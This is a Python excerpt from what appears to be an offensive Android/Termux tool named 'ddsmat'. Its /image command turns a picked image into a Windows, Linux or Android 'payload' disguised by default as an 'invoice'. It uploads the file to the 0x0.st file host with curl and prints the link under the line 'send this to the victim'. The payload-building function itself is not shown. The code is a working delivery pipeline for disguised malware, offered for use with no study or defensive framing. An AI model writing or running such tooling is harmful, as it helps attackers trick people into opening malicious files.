def _pick_file() -> Path | None:
    """Open Android file picker, return picked file path."""
    tmp = Path(tempfile.gettempdir()) / f"ddsmat_pick_{int(time.time())}"
    # try termux-api picker first
    if shutil.which("termux-storage-get"):
        try:
            subprocess.run(["termux-storage-get", str(tmp)], timeout=180)
            if tmp.exists() and tmp.stat().st_size > 0:
                return tmp
        except Exception:
            pass
    # fallback: ask for a path
    try:
        p = input("no picker available. path to image: ").strip()
        if p:
            pp = Path(p).expanduser()
            if pp.exists():
                return pp
    except Exception:
        pass
    return None


def _upload_0x0(path: Path) -> str:
    """Upload to 0x0.st and return the URL. Requires `curl` (in termux by default)."""
    try:
        p = subprocess.run(
            ["curl", "-s", "-F", f"file=@{path}", "https://0x0.st"],
            capture_output=True, text=True, timeout=120,
        )
        url = (p.stdout or "").strip()
        if url.startswith("http"):
            return url
    except Exception:
        pass
    return ""


def cmd_image(args):
    """ /image [path] [name] [target]  — path optional, opens picker if missing """
    src = None
    name = "invoice"
    target = "windows"

    # parse args flexibly
    if args:
        # if first arg looks like a file, use it as src
        first = Path(args[0]).expanduser()
        if first.exists():
            src = first
            if len(args) > 1: name = args[1]
            if len(args) > 2: target = args[2]
        else:
            # treat as name
            name = args[0]
            if len(args) > 1: target = args[1]

    if src is None:
        print("[ddsmat] opening file picker …")
        src = _pick_file()
        if src is None:
            print("[ddsmat] no file picked. aborting.")
            return

    if target not in ("windows", "linux", "android"):
        print("target must be windows, linux, or android")
        return

    print(f"[ddsmat] building {target} payload from {src.name} …")
    try:
        out, display = build(src, name, target, BUILDS)
    except Exception as e:
        print(f"[ddsmat] build failed: {e}")
        return

    size_kb = out.stat().st_size / 1024
    print(f"[ddsmat] built: {out}")
    print(f"[ddsmat] display: {display}   ({size_kb:.1f} KB)")

    # try to give a link
    print("[ddsmat] uploading …")
    url = _upload_0x0(out)
    if url:
        print(f"[ddsmat] link: {url}")
        print(f"\nsend this to the victim:")
        print(f"   {url}")
    else:
        print(f"[ddsmat] upload failed (no internet or curl missing).")
        print(f"[ddsmat] local path: {out.resolve()}")
        print(f"[ddsmat] manual share: termux-share -a send {out}")


def cmd_link(args):
    """ /link [file]  — if no arg, links the most recent build """
    if args:
        p = Path(args[0]).expanduser()
    else:
        files = [f for f in sorted(BUILDS.glob("*")) if f.is_file() and not f.name.startswith(".")]
        if not files:
            print("no builds. run /image first.")
            return
        p = files[-1]
        print(f"[ddsmat] using latest build: {p.name}")

    if not p.exists():
        print(f"no such file: {p}")
        return

    print("[ddsmat] uploading …")
    url = _upload_0x0(p)
    if url:
        print(f"[ddsmat] link: {url}")
    else:
        print(f"[ddsmat] upload failed.")
        print(f"[ddsmat] local: {p.resolve()}")
        print(f"[ddsmat] share: termux-share -a send {p}")
